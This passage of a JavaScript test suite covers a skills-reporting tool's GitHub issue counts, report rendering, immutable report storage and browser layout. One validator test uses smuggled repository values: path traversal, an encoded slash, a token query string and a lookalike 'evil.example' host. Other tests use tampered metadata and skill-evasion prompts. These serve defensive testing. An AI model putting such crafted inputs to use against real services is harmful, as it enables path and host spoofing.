          html_url: "https://github.com/quickstark/skills/issues/44",
          labels: [],
        },
        {
          number: 52,
          title: "A pull request is not an open issue",
          state: "open",
          html_url: "https://github.com/quickstark/skills/issues/52",
          pull_request: { url: "https://api.github.com/repos/quickstark/skills/pulls/52" },
          labels: [],
        },
        {
          number: 99,
          title: "Another repository cannot supply project context",
          state: "open",
          html_url: "https://github.com/quickstark/other/issues/99",
          labels: [],
        },
      ]
      : {
        full_name: "quickstark/skills",
        html_url: "https://github.com/quickstark/skills",
        default_branch: "main",
        visibility: "public",
      },
  ), { headers: { "Content-Type": "application/json" } });

  const github = await observeGitHubProject(project, { fetcher });

  assert.equal(github.fullName, "quickstark/skills");
  assert.deepEqual(github.issues.map((issue) => issue.number), [21]);
  assert.deepEqual(github.issues[0].labels, ["ready-for-agent"]);
});

test("GitHub reports its independently verified issue total separately from a limited issue sample", async () => {
  const requested = [];
  const firstPage = Array.from({ length: 8 }, (_, index) => ({
    number: index + 1,
    title: `Verified open report issue ${index + 1}`,
    state: "open",
    html_url: `https://github.com/quickstark/skills/issues/${index + 1}`,
    labels: [],
  }));
  const fetcher = async (url) => {
    requested.push(url);

    const payload = url.includes("/search/issues?")
      ? {
        total_count: 22,
        incomplete_results: false,
        items: [firstPage[0]],
      }
      : url.endsWith("/issues?state=open&per_page=8")
        ? firstPage
        : {
          full_name: "quickstark/skills",
          html_url: "https://github.com/quickstark/skills",
          default_branch: "main",
          visibility: "public",
        };

    return new Response(JSON.stringify(payload), {
      headers: { "Content-Type": "application/json" },
    });
  };

  const github = await observeGitHubProject(quickStarkProject, { fetcher });

  assert.equal(github.fullName, "quickstark/skills");
  assert.equal(github.openIssueCount, 22);
  assert.equal(github.issues.length, 8);
  assert.ok(
    requested.some((url) => {
      const parsed = new URL(url);

      return parsed.pathname === "/search/issues"
        && parsed.searchParams.get("q") === "repo:quickstark/skills is:issue is:open";
    }),
    "the full issue-only total comes from an independently verified GitHub search",
  );
});

test("GitHub rejects issues whose open state was not independently observed", async () => {
  const fetcher = async (url) => {
    const payload = url.includes("/search/issues?")
      ? { total_count: 1, incomplete_results: false, items: [] }
      : url.endsWith("/issues?state=open&per_page=8")
        ? [
          {
            number: 71,
            title: "Missing issue state must fail closed",
            html_url: "https://github.com/quickstark/skills/issues/71",
            labels: [],
          },
          {
            number: 72,
            title: "Null issue state must fail closed",
            state: null,
            html_url: "https://github.com/quickstark/skills/issues/72",
            labels: [],
          },
          {
            number: 73,
            title: "Only a verified open issue is displayed",
            state: "open",
            html_url: "https://github.com/quickstark/skills/issues/73",
            labels: [],
          },
        ]
        : {
          full_name: "quickstark/skills",
          html_url: "https://github.com/quickstark/skills",
          default_branch: "main",
          visibility: "public",
        };

    return new Response(JSON.stringify(payload), {
      headers: { "Content-Type": "application/json" },
    });
  };

  const github = await observeGitHubProject(quickStarkProject, { fetcher });

  assert.deepEqual(github.issues.map((issue) => issue.number), [73]);
  assert.equal(github.openIssueCount, 1);
});

test("the five-second summary displays the verified issue total instead of the sidebar sample", () => {
  const report = normalizeSkillReadout({
    skill: "qs-code-debug",
    outcome: "Preserve the independently verified GitHub issue count.",
    projectIdentity: quickStarkProject,
  });
  const github = {
    fullName: "quickstark/skills",
    url: "https://github.com/quickstark/skills",
    defaultBranch: "main",
    visibility: "public",
    openIssueCount: 22,
    issues: Array.from({ length: 8 }, (_, index) => ({
      number: index + 1,
      title: `Verified open issue ${index + 1}`,
      url: `https://github.com/quickstark/skills/issues/${index + 1}`,
      labels: [],
    })),
  };
  const summary = renderReadoutSignalSummary(
    report,
    READOUT_PROFILES_BY_NAME[report.skill.name],
    { github },
  );

  assert.match(
    summary,
    /<span>OPEN ISSUES<\/span><strong>22<\/strong><small>Verified GitHub issues<\/small>/,
  );
  assert.doesNotMatch(summary, /<span>OPEN ISSUES<\/span><strong>8<\/strong>/);
});

test("a completed clean code review recommends verified Git integration as its next action", () => {
  const input = {
    skill: "qs-review-code",
    outcome: "Independently verified the approved reporting change; main remains ahead of origin/main.",
    findings: [],
    checks: [{ title: "Independent review and production regression suite", status: "passed" }],
  };
  const report = normalizeSkillReadout(input);
  const html = renderSkillReadout(input);

  assert.equal(report.nextSkills[0].name, "qs-git-merge");
  assert.match(report.nextSkills[0].prompt, /^Use \$qs-git-merge\b/);
  assert.match(report.nextSkills[0].prompt, /main remains ahead of origin\/main/i);
  assert.match(html, /\$qs-git-merge/);
  assert.doesNotMatch(html, /Merged pull request|Published commit|Released version/);
});

test("tested and independently reviewed build and TDD reports surface the pending GitHub integration", () => {
  for (const [skill, skillsUsed] of [
    ["qs-code-build", ["qs-code-build", "qs-test-tdd", "qs-review-code"]],
    ["qs-test-tdd", ["qs-test-tdd", "qs-review-code"]],
  ]) {
    const input = {
      skill,
      skillsUsed,
      outcome: "Verified the implementation and review; the current main commit has not been published to GitHub.",
      findings: [],
      checks: [{ title: "Behavior-first regression suite", status: "passed" }],
    };
    const report = normalizeSkillReadout(input);
    const html = renderSkillReadout(input);

    assert.equal(report.nextSkills[0].name, "qs-git-merge", skill);
    assert.match(report.nextSkills[0].prompt, /^Use \$qs-git-merge\b/, skill);
    assert.match(report.nextSkills[0].prompt, /has not been published to GitHub/i, skill);
    assert.match(html, /\$qs-git-merge/, skill);
    assert.doesNotMatch(html, /Merged pull request|Published commit|Released version/, skill);
  }
});

test("actionable reviews and failed checks never recommend merging an unready change", () => {
  for (const input of [
    {
      skill: "qs-review-code",
      outcome: "An independently observed review finding must be fixed before integration.",
      findings: [{ title: "Documented requirement is not implemented", priority: "P1" }],
      checks: [{ title: "Regression suite", status: "passed" }],
    },
    {
      skill: "qs-review-code",
      outcome: "A failed regression must not be published.",
      findings: [],
      checks: [{ title: "Regression suite", status: "failed" }],
    },
    {
      skill: "qs-code-build",
      skillsUsed: ["qs-code-build", "qs-review-code"],
      outcome: "An independently reviewed implementation still has a failing check.",
      checks: [{ title: "Regression suite", status: "failed" }],
    },
  ]) {
    const report = normalizeSkillReadout(input);

    assert.notEqual(report.nextSkills[0].name, "qs-git-merge", input.outcome);
    assert.doesNotMatch(report.nextSkills[0].prompt, /^Use \$qs-git-merge\b/, input.outcome);
  }
});

test("Git integration preserves a separate explicitly approved release step", () => {
  const input = {
    skill: "qs-git-merge",
    outcome: "Verified the current branch and GitHub integration without claiming a release.",
    checks: [{ title: "Integrated production regression suite", status: "passed" }],
  };
  const report = normalizeSkillReadout(input);
  const release = report.nextSkills.find((next) => next.name === "qs-deploy-release");
  const html = renderSkillReadout(input);

  assert.ok(release, "a documented GitHub delivery can lead to a separately approved release");
  assert.match(release.prompt, /^Use \$qs-deploy-release\b/);
  assert.match(release.reason, /approved|explicit/i);
  assert.match(html, /\$qs-deploy-release/);
  assert.doesNotMatch(html, /Merged pull request|Published commit|Released version/);
});

test("the Git skill distinguishes a real merge, a pull request, and publishing an ahead default branch", async () => {
  const skill = SKILLS_BY_NAME.get("qs-git-merge");
  const [instructions, agent, documentation] = await Promise.all([
    readFile(join(process.cwd(), "skills/engineering/qs-git-merge/SKILL.md"), "utf8"),
    readFile(join(process.cwd(), "skills/engineering/qs-git-merge/agents/openai.yaml"), "utf8"),
    readFile(join(process.cwd(), "docs/engineering/qs-git-merge.md"), "utf8"),
  ]);

  assert.match(skill.shortDescription, /GitHub|publish|integration/i);
  assert.match(skill.prompt, /GitHub|publish|pull request/i);
  assert.match(instructions, /git push origin main/);
  assert.match(instructions, /pull request/i);
  assert.match(instructions, /explicit(?:ly)? (?:requested|approved|authorized)/i);
  assert.match(instructions, /no (?:branch )?merge|no merge.*(?:required|necessary)/i);
  assert.match(instructions, /upstream.*(?:read.only|never push)|never push.*upstream/i);
  assert.match(agent, /GitHub|publish|integration/i);
  assert.match(documentation, /git push origin main/);
  assert.match(documentation, /pull request/i);
  assert.match(documentation, /explicit(?:ly)? (?:requested|approved|authorized)/i);
});

test("the engineering router places GitHub integration between a passing review and an explicitly approved release", async () => {
  const [router, readme, engineering] = await Promise.all([
    readFile(join(process.cwd(), "skills/engineering/qs-help/SKILL.md"), "utf8"),
    readFile(join(process.cwd(), "README.md"), "utf8"),
    readFile(join(process.cwd(), "skills/engineering/README.md"), "utf8"),
  ]);
  const newWork = router.slice(
    router.indexOf("## Order of operations: new work"),
    router.indexOf("## Order of operations: refactoring"),
  );
  const refactoring = router.slice(
    router.indexOf("## Order of operations: refactoring"),
    router.indexOf("## Every skill and its purpose"),
  );

  for (const [label, workflow] of [["new work", newWork], ["refactoring", refactoring]]) {
    const review = workflow.indexOf("/qs-review-code");
    const integration = workflow.indexOf("/qs-git-merge", review + 1);
    const release = workflow.indexOf("/qs-deploy-release", integration + 1);

    assert.ok(review >= 0, `${label} includes an independent review`);
    assert.ok(integration > review, `${label} integrates only after review`);
    assert.ok(release > integration, `${label} keeps deployment separate from GitHub integration`);
    assert.match(workflow, /explicit(?:ly)?|approval|authorization/i, `${label} preserves explicit external authorization`);
  }

  assert.match(readme, /\/qs-review-code[\s\S]{0,100}\/qs-git-merge[\s\S]{0,100}\/qs-deploy-release/);
  assert.match(engineering, /qs-git-merge[^\n]*(?:GitHub|publish|integration)/i);
});

test("locally observed branches and unpublished commits never become GitHub artifact links", () => {
  const report = normalizeSkillReadout({
    skill: "qs-code-build",
    outcome: "Keep unpublished local Git observations separate from verified GitHub delivery.",
    projectIdentity: quickStarkProject,
  });
  const metadata = renderReadoutProjectMetadata({
    ...report,
    gitContext: {
      branch: "local-unpublished-report-fix",
      revision: "8146b2ac285d5ba0abb2bbc3db669f31582e0a65",
      ahead: 1,
      behind: 0,
      dirtyCount: 2,
    },
  }, {
    github: {
      fullName: "quickstark/skills",
      url: "https://github.com/quickstark/skills",
      defaultBranch: "main",
      visibility: "public",
      openIssueCount: 22,
      issues: [],
    },
  });

  assert.match(metadata, /local-unpublished-report-fix/);
  assert.match(metadata, /8146b2ac/);
  assert.match(metadata, /Observed local Git/);
  assert.match(metadata, /href="https:\/\/github\.com\/quickstark\/skills"/);
  assert.doesNotMatch(metadata, /github\.com\/quickstark\/skills\/(?:tree|commit)\//);
});

test("independently published matching GitHub commits retain their verified artifact links", () => {
  const sha = "0123456789abcdef0123456789abcdef01234567";
  const report = normalizeSkillReadout({
    skill: "qs-code-build",
    outcome: "Retain the exact verified published delivery commit.",
    projectIdentity: quickStarkProject,
    provenance: {
      commit: {
        sha,
        published: true,
        url: `https://github.com/quickstark/skills/commit/${sha}`,
      },
    },
  });
  const metadata = renderReadoutProjectMetadata(report, {
    github: {
      fullName: "quickstark/skills",
      url: "https://github.com/quickstark/skills",
      defaultBranch: "main",
      visibility: "public",
    },
  });

  assert.match(metadata, new RegExp(`href="https://github\\.com/quickstark/skills/commit/${sha}"`));
  assert.match(metadata, /Verified delivery evidence/);
  assert.doesNotMatch(metadata, /github\.com\/quickstark\/skills\/tree\//);
});

test("an incomplete GitHub issue search never promotes a sidebar sample into a verified total", async () => {
  const issues = [{
    number: 21,
    title: "An independently verified open report issue",
    state: "open",
    html_url: "https://github.com/quickstark/skills/issues/21",
    labels: [],
  }];
  const fetcher = async (url) => {
    const payload = url.includes("/search/issues?")
      ? { total_count: 22, incomplete_results: true, items: issues }
      : url.endsWith("/issues?state=open&per_page=8")
        ? issues
        : {
          full_name: "quickstark/skills",
          html_url: "https://github.com/quickstark/skills",
          default_branch: "main",
          visibility: "public",
        };

    return new Response(JSON.stringify(payload), {
      headers: { "Content-Type": "application/json" },
    });
  };
  const github = await observeGitHubProject(quickStarkProject, { fetcher });
  const report = normalizeSkillReadout({
    skill: "qs-code-build",
    outcome: "Keep an incomplete GitHub issue count explicitly unverified.",
    projectIdentity: quickStarkProject,
  });
  const summary = renderReadoutSignalSummary(
    report,
    READOUT_PROFILES_BY_NAME[report.skill.name],
    { github },
  );
  const sidebar = renderReadoutGitHubIssues(github);

  assert.equal(github.openIssueCount, null);
  assert.deepEqual(github.issues.map((issue) => issue.number), [21]);
  assert.match(summary, /<span>OPEN ISSUES<\/span><strong>—<\/strong><small>Not independently verified<\/small>/);
  assert.match(sidebar, /Showing 1 verified open issue; total not independently verified/);
  assert.match(sidebar, /An independently verified open report issue/);
  assert.doesNotMatch(sidebar, /<span class="section-count">(?:1|22)<\/span>/);
});

test("immutable reports preserve the verified issue total and the separately verified sidebar sample", async (context) => {
  const { directory } = await productionWorkbench(context);
  const github = verifiedGithubFixture();
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Record the full GitHub issue total without confusing it with sidebar samples.",
    generatedAt: "2026-07-27T16:00:00.000Z",
    projectIdentity: { ...quickStarkProject, source: "git-origin" },
  }, {
    directory,
    layout: "project",
    cwd: process.cwd(),
    githubFetcher: github.fetcher,
  });
  const html = await readFile(report.path, "utf8");
  const captured = [...html.matchAll(/<meta name="quickstark:github-issue" content="([^"]*)">/g)];

  assert.equal(github.requested.length, 3, "only the three independently verified GitHub endpoints are requested");
  assert.match(html, /<meta name="quickstark:github-open-issues" content="22">/);
  assert.match(html, /<meta name="quickstark:github-open-issues-source" content="github-issue-search">/);
  assert.doesNotMatch(html, /<meta name="quickstark:github-open-issues" content="8">/);
  assert.equal(captured.length, 8, "the independently verified first-page sample is recorded separately");
  assert.match(html, /<span>OPEN ISSUES<\/span><strong>22<\/strong>/);
  assert.match(html, /Showing 3 of 22 verified open issues/);
});

test("the full-height Workbench places verified relevant GitHub issues in a separate sidebar", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const github = verifiedGithubFixture();
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Display independently verified issue context outside the selected report.",
    generatedAt: "2026-07-27T16:05:00.000Z",
    projectIdentity: { ...quickStarkProject, source: "git-origin" },
    findings: [{ title: "The sidebar preserves the actual 22-issue total.", priority: "P2" }],
  }, {
    directory,
    layout: "project",
    cwd: process.cwd(),
    githubFetcher: github.fetcher,
  });
  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const response = await fetch(new URL(`?${parameters}`, viewer.url));
  const html = await response.text();
  const reportStart = html.indexOf('aria-label="Selected skill readout"');
  const sidebarStart = html.indexOf('aria-label="Relevant open GitHub issues"');

  assert.equal(response.status, 200);
  assert.notEqual(reportStart, -1, "the selected immutable report remains in its reading pane");
  assert.ok(sidebarStart > reportStart, "the issue sidebar is a separate sibling after the report pane");
  assert.match(html, /<span>OPEN ISSUES<\/span><strong>22<\/strong>/);
  assert.match(html.slice(sidebarStart), /Showing 3 of 22 verified open issues/);
  assert.match(html.slice(sidebarStart), /Verified open report issue 1/);
  assert.doesNotMatch(html.slice(reportStart, sidebarStart), /<h2>Relevant open issues<\/h2>/);
  assert.doesNotMatch(html, /github\.com\/quickstark\/skills\/(?:tree|commit)\//);
});

test("stored issue sidebars reject cross-repository immutable metadata without discarding the verified total", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const github = verifiedGithubFixture();
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Reject a GitHub issue whose immutable evidence belongs to another repository.",
    generatedAt: "2026-07-27T16:07:00.000Z",
    projectIdentity: { ...quickStarkProject, source: "git-origin" },
  }, {
    directory,
    layout: "project",
    cwd: process.cwd(),
    githubFetcher: github.fetcher,
  });
  const original = await readFile(report.path, "utf8");
  const unsafeIssue = JSON.stringify({
    number: 1,
    title: "A cross-repository issue must not enter the sidebar",
    url: "https://github.com/quickstark/another-repository/issues/1",
    labels: ["reporting"],
  }).replaceAll('"', "&quot;");
  const tampered = original.replace(
    /<meta name="quickstark:github-issue" content="[^"]*">/,
    `<meta name="quickstark:github-issue" content="${unsafeIssue}">`,
  );

  assert.notEqual(tampered, original, "the security fixture replaces actual captured GitHub issue metadata");

  await writeFile(report.path, tampered);

  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const response = await fetch(new URL(`?${parameters}`, viewer.url));
  const html = await response.text();

  assert.equal(response.status, 200);
  assert.match(html, /<span>OPEN ISSUES<\/span><strong>22<\/strong>/);
  assert.doesNotMatch(html, /aria-label="Relevant open GitHub issues"/);
  assert.doesNotMatch(html, /A cross-repository issue must not enter the sidebar/);
  assert.match(html, /aria-label="Complete immutable skill readout"/);
  assert.equal(await readFile(report.path, "utf8"), tampered, "reading the project library never overwrites stored report bytes");
});

test("legacy first-page issue counts are not reclassified as independently verified totals", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const github = verifiedGithubFixture();
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Preserve historical report bytes without repeating an unverified first-page issue count.",
    generatedAt: "2026-07-27T16:08:00.000Z",
    projectIdentity: { ...quickStarkProject, source: "git-origin" },
  }, {
    directory,
    layout: "project",
    cwd: process.cwd(),
    githubFetcher: github.fetcher,
  });
  const original = await readFile(report.path, "utf8");
  const historical = original
    .replace(
      '<meta name="quickstark:github-open-issues" content="22">',
      '<meta name="quickstark:github-open-issues" content="8">',
    )
    .replace(/\s*<meta name="quickstark:github-open-issues-source" content="github-issue-search">/, "")
    .replace(/\s*<meta name="quickstark:github-issue" content="[^"]*">/g, "");

  assert.notEqual(historical, original);

  await writeFile(report.path, historical);

  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const response = await fetch(new URL(`?${parameters}`, viewer.url));
  const html = await response.text();

  assert.equal(response.status, 200);
  assert.match(html, /<span>OPEN ISSUES<\/span><strong>—<\/strong><small>Not independently verified<\/small>/);
  assert.doesNotMatch(html, /<span>OPEN ISSUES<\/span><strong>8<\/strong>/);
  assert.equal(await readFile(report.path, "utf8"), historical, "a legacy report is never rewritten to repair historical evidence");
});

test("actual Chromium renders the GitHub issue rail outside the full-height report pane", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const github = verifiedGithubFixture();
  const report = await writeSkillReadout({
    skill: "qs-code-debug",
    outcome: "Verify the report and issue sidebar in the actual production browser.",
    generatedAt: "2026-07-27T16:10:00.000Z",
    projectIdentity: { ...quickStarkProject, source: "git-origin" },
    findings: [{
      title: "The independently verified issue rail remains a separate sidebar.",
      detail: "The selected immutable report remains visible beside verified GitHub issue context.",
      priority: "P2",
    }],
  }, {
    directory,
    layout: "project",
    cwd: process.cwd(),
    githubFetcher: github.fetcher,
  });
  const original = await readFile(report.path, "utf8");
  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const browser = await chromium.launch({ headless: true });

  context.after(async () => browser.close());

  const page = await browser.newPage({
    viewport: { width: 1734, height: 1100 },
  });
  const response = await page.goto(new URL(`?${parameters}`, viewer.url).href);
  const selected = page.getByRole("complementary", { name: "Selected skill readout" });
  const sidebar = page.getByRole("complementary", { name: "Relevant open GitHub issues" });

  assert.equal(response.status(), 200);
  assert.equal(await selected.count(), 1);
  assert.equal(await sidebar.count(), 1);
  assert.equal(await selected.getByRole("heading", { name: "Relevant open issues" }).count(), 0);
  assert.equal(await sidebar.getByRole("heading", { name: "Relevant open issues" }).count(), 1);
  assert.equal(await sidebar.getByText("Showing 3 of 22 verified open issues", { exact: true }).count(), 1);
  assert.equal(await sidebar.getByRole("link", { name: /Verified open report issue/ }).count(), 3);

  const desktopLayout = await page.evaluate(() => {
    const detail = document.querySelector('[aria-label="Selected skill readout"]').getBoundingClientRect();
    const issues = document.querySelector('[aria-label="Relevant open GitHub issues"]').getBoundingClientRect();
    const shell = document.querySelector(".workbench-shell");

    return {
      detailRight: detail.right,
      issueLeft: issues.left,
      shellOverflows: shell.scrollWidth > shell.clientWidth,
      viewportHeight: document.querySelector(".workbench-page").getBoundingClientRect().height,
    };
  });

  assert.ok(desktopLayout.issueLeft >= desktopLayout.detailRight - 1, "the GitHub rail is visibly beside the selected report");
  assert.equal(desktopLayout.shellOverflows, false, "the separate sidebar does not introduce horizontal overflow");
  assert.equal(desktopLayout.viewportHeight, 1100, "the production Workbench fills the actual viewport");

  await page.setViewportSize({ width: 600, height: 1000 });

  const mobileLayout = await page.evaluate(() => {
    const detail = document.querySelector('[aria-label="Selected skill readout"]').getBoundingClientRect();
    const issues = document.querySelector('[aria-label="Relevant open GitHub issues"]').getBoundingClientRect();

    return {
      detailBottom: detail.bottom,
      issueTop: issues.top,
      horizontalOverflow: document.documentElement.scrollWidth > innerWidth,
    };
  });

  assert.ok(mobileLayout.issueTop >= mobileLayout.detailBottom - 1, "the issue rail moves below the report on narrow screens");
  assert.equal(mobileLayout.horizontalOverflow, false, "the mobile Workbench stays inside the actual viewport");
  assert.equal(await readFile(report.path, "utf8"), original, "browser navigation never rewrites the immutable report");
});

test("GitHub verification rejects unsafe repository identities before making an external request", async () => {
  for (const project of [
    { host: "github.com", owner: "../quickstark", repository: "skills" },
    { host: "github.com", owner: "quickstark%2Fother", repository: "skills" },
    { host: "github.com", owner: "quickstark", repository: "skills/../private" },
    { host: "github.com", owner: "quickstark", repository: "skills?token=private" },
    { host: "github.com", owner: "quickstark", repository: ".." },
    { host: "github.com.evil.example", owner: "quickstark", repository: "skills" },
  ]) {
    const requested = [];
    const fetcher = async (url) => {
      requested.push(url);
      return new Response(JSON.stringify({
        full_name: "quickstark/skills",
        html_url: "https://github.com/quickstark/skills",
      }), { headers: { "Content-Type": "application/json" } });
    };

    assert.equal(
      await observeGitHubProject(project, { fetcher }),
      null,
      `${project.owner}/${project.repository} must not become verified`,
    );
    assert.deepEqual(
      requested,
      [],
      `${project.owner}/${project.repository} must not trigger an external request`,
    );
  }
});

test("production B renders actual 13 px featured details, 12 px native prompts, and aligned responsive cards", async (context) => {
  const featuredDetail = "The full-height report keeps its recorded observation independently readable.";
  const nextSkills = [
    {
      name: "qs-test-tdd",
      reason: "Protect the confirmed production failure with a regression test.",
      prompt: "Use $qs-test-tdd to protect the confirmed full-height report regression.",
    },
    {
      name: "qs-review-code",
      reason: "Independently review the recorded report, sidebar, issue ownership, immutable history, verified issue totals, publication boundaries, and responsive presentation before treating the implementation as complete.",
      prompt: "Use $qs-review-code to independently inspect the full-height report, verified GitHub issue total, responsive presentation, complete native prompts, preserved immutable historical reports, and unlinked local Git artifacts.",
    },
    {
      name: "qs-design-architecture",
      reason: "Inspect the confirmed architectural boundary.",
      prompt: "Use /qs-design-architecture to inspect the verified production boundary.",
    },
  ];
  const browser = await chromium.launch({ headless: true });

  context.after(async () => browser.close());

  const page = await browser.newPage({
    viewport: { width: 1734, height: 1100 },
  });

  await page.setContent(renderSkillReadout({
    skill: "qs-code-debug",
    outcome: "Verify the approved B layout in an actual Chromium browser.",
    findings: [{
      title: "A recorded production observation",
      detail: featuredDetail,
      priority: "P2",
    }],
    nextSkills,
  }), { waitUntil: "load" });

  assert.equal(
    await page.getByRole("group", { name: "Five-second report summary" })
      .getByText(featuredDetail, { exact: true }).evaluate(
      (element) => getComputedStyle(element).fontSize,
    ),
    "13px",
    "the browser actually renders the featured observation at 13 px",
  );

  const cards = page.locator("article.next-card");

  assert.equal(await cards.count(), 3);

  for (const [index, next] of nextSkills.entries()) {
    const card = cards.nth(index);
    const reason = card.getByText(next.reason, { exact: true });
    const code = card.locator("pre code");

    assert.equal(await reason.evaluate((element) => getComputedStyle(element).fontSize), "12px");
    assert.equal(await code.evaluate((element) => getComputedStyle(element).fontSize), "12px");
    assert.equal(await code.textContent(), next.prompt, "the actual visible prompt remains complete and copy-ready");
  }

  const desktop = await cards.evaluateAll((elements) => elements.map((element) => {
    const card = element.getBoundingClientRect();
    const prompt = element.querySelector("pre").getBoundingClientRect();

    return { top: card.top, bottom: card.bottom, promptTop: prompt.top };
  }));

  for (const card of desktop.slice(1)) {
    assert.ok(Math.abs(card.top - desktop[0].top) <= 1, "all three desktop cards begin on the same row");
    assert.ok(Math.abs(card.bottom - desktop[0].bottom) <= 1, "unequal prompts retain equal desktop card heights");
    assert.ok(Math.abs(card.promptTop - desktop[0].promptTop) <= 1, "copy-ready prompts align despite unequal explanation lengths");
  }

  await page.setViewportSize({ width: 1040, height: 1000 });

  const tablet = await cards.evaluateAll((elements) => elements.map((element) => {
    const box = element.getBoundingClientRect();

    return { top: box.top, bottom: box.bottom };
  }));

  assert.ok(Math.abs(tablet[0].top - tablet[1].top) <= 1, "the first two tablet cards share a row");
  assert.ok(Math.abs(tablet[0].bottom - tablet[1].bottom) <= 1, "tablet cards remain equal in height");
  assert.ok(tablet[2].top > tablet[0].bottom, "the third tablet card wraps to its next row");

  await page.setViewportSize({ width: 760, height: 1000 });

  const mobile = await cards.evaluateAll((elements) => elements.map((element) => {
    const box = element.getBoundingClientRect();

    return { top: box.top, bottom: box.bottom };
  }));

  assert.ok(mobile[1].top > mobile[0].bottom, "the second mobile card wraps below the first");
  assert.ok(mobile[2].top > mobile[1].bottom, "the third mobile card wraps below the second");
  assert.equal(
    await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
    true,
    "responsive cards never introduce horizontal page overflow",
  );
});

test("unequal native and historical prompts remain complete, aligned, and separate from model guidance", () => {
  const input = {
    skill: "qs-code-debug",
    outcome: "Diagnosed the observed full-height production regression.",
    nextSkills: [
      {
        name: "qs-test-tdd",
        reason: "Add a focused regression test.",
        prompt: "Use $qs-test-tdd to prevent the confirmed viewport regression.",
      },
      {
        name: "qs-review-code",
        reason: "Review the actual fix against the reported regression, responsive layout, and historical readout boundaries without inventing additional work.",
        prompt: "Use $qs-review-code to inspect the verified responsive production fix, preserved historical reports, and exact native skill prompt boundaries.",
      },
      {
        name: "qs-design-architecture",
        reason: "Inspect the verified architecture only if the failure recurs.",
        prompt: "Use /qs-design-architecture to investigate the recorded viewport boundary.",
      },
    ],
  };
  const report = normalizeSkillReadout(input);
  const html = renderSkillReadout(input);
  const cards = [...html.matchAll(
    /<article class="next-card">([\s\S]*?)<\/article>/g,
  )];

  assert.equal(cards.length, 3, "all three approved prompt cards remain visible");

  for (const [index, card] of cards.entries()) {
    const item = report.nextSkills[index];
    const code = card[1].match(/<pre class="next-prompt-block"><code>([\s\S]*?)<\/code><\/pre>/);

    assert.ok(code, `${item.name} provides a complete copy-ready prompt`);
    assert.equal(code[1], item.prompt);
    assert.ok(card[1].includes(`$${item.name}`), `${item.name} remains discoverable in the native skill picker`);
    assert.ok(card[1].includes(item.reason), `${item.name} explains why it is recommended`);
    assert.ok(
      card[1].indexOf(item.reason) < card[1].indexOf('<pre class="next-prompt-block">'),
      `${item.name} explains its reasoning before the complete prompt`,
    );
    assert.ok(
      card[1].indexOf('</pre>') < card[1].indexOf('aria-label="Heuristic model and thinking guidance"'),
      `${item.name} keeps suggested model and thinking below the copy-ready prompt`,
    );
    assert.doesNotMatch(code[1], /Suggested model|Suggested thinking|Heuristic suggestion/);
  }

  assert.match(cards[0][1], /RECOMMENDED/);
  assert.match(cards[1][1], /ALTERNATIVE/);
  assert.match(cards[2][1], /Use \/qs-design-architecture/);
});

test("production reports accept only the exact approved dollar or slash skill as the first action", () => {
  const input = {
    skill: "qs-code-debug",
    outcome: "Preserve strict, backward-compatible first-action validation.",
  };

  for (const prompt of [
    "Use $qs-test-tdd to protect the actual reporting boundary.",
    "Use /qs-test-tdd to protect the actual reporting boundary.",
    "  USE   $qs-test-tdd to protect the actual reporting boundary.  ",
    "  USE   /qs-test-tdd to protect the actual reporting boundary.  ",
  ]) {
    const report = normalizeSkillReadout({
      ...input,
      nextSkills: [{ name: "qs-test-tdd", prompt }],
    });

    assert.equal(report.nextSkills[0].prompt, prompt.trim());
  }

  for (const prompt of [
    "Use $qs-test-tdd-extra to evade the approved skill.",
    "Use /qs-test-tdd-extra to evade the approved skill.",
    "Use $qs-test-tdd:extra to evade the approved skill.",
    "Use /qs-test-tdd:extra to evade the approved skill.",
    "Use $qs-review-code before $qs-test-tdd.",
    "Use /qs-review-code before /qs-test-tdd.",
    "Mention $qs-test-tdd and then implement something else.",
    "Do not use /qs-test-tdd; use /qs-review-code instead.",
  ]) {
    assert.throws(
      () => normalizeSkillReadout({
        ...input,
        nextSkills: [{ name: "qs-test-tdd", prompt }],
      }),
      /must explicitly invoke \/qs-test-tdd as its first action/i,
      prompt,
    );
  }
});

test("all 24 first-run B summaries show honest preview states without invented findings or check progress", () => {
  assert.equal(SKILLS.length, 24, "the test covers every actual promoted QuickStark skill");

  for (const skill of SKILLS) {
    const html = renderSkillReadout({
      skill: skill.name,
      status: "Preview",
      skillsUsed: [],
      outcome: `Catalog preview only; ${skill.displayName} has not run.`,
      findings: [{
        title: "Catalog description is not an observed critical finding",
        detail: skill.shortDescription,
        priority: "P0",
      }],
    });
    const summary = html.match(
      /<div class="presentation-summary-panel">([\s\S]*?)\n\s*<section class="section">/,
    );

    assert.ok(summary, `${skill.name} exposes its public five-second preview`);
    assert.match(summary[1], /READY TO RUN/, skill.name);
    assert.match(summary[1], /FIRST RUN/, skill.name);
    assert.match(summary[1], /No actual skill run has been recorded/, skill.name);
    assert.match(summary[1], /aria-label="No checks recorded"/, skill.name);
    assert.doesNotMatch(summary[1], /NEEDS ATTENTION|NO CRITICAL EXCEPTIONS/, skill.name);
    assert.doesNotMatch(summary[1], /Catalog description is not an observed critical finding/, skill.name);
    assert.doesNotMatch(summary[1], /<svg\b|recorded checks passed/i, skill.name);
  }
});

test("a failed recorded check leads the summary without hiding skipped checks or inventing progress", () => {
  const html = renderSkillReadout({
    skill: "qs-code-debug",
    outcome: "Recorded the actual regression and its check outcomes.",
    findings: [{
      title: "A routine observation must not conceal a failed check",
      priority: "P3",
    }],
    checks: [
      { title: "Confirmed native prompt validation", status: "passed" },
      { title: "The full-height viewport regression remains reproducible", status: "failed" },
      { title: "Optional browser check", status: "skipped" },
    ],
  });
  const featured = html.match(
    /<article class="presentation-featured-signal">([\s\S]*?)<\/article>/,
  );

  assert.ok(featured, "the actual failed check remains visible at a glance");
  assert.match(featured[1], />FAILED CHECK</);
